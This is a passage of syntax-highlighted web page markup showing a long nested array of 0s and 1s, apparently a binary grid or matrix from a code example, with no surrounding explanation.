class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token 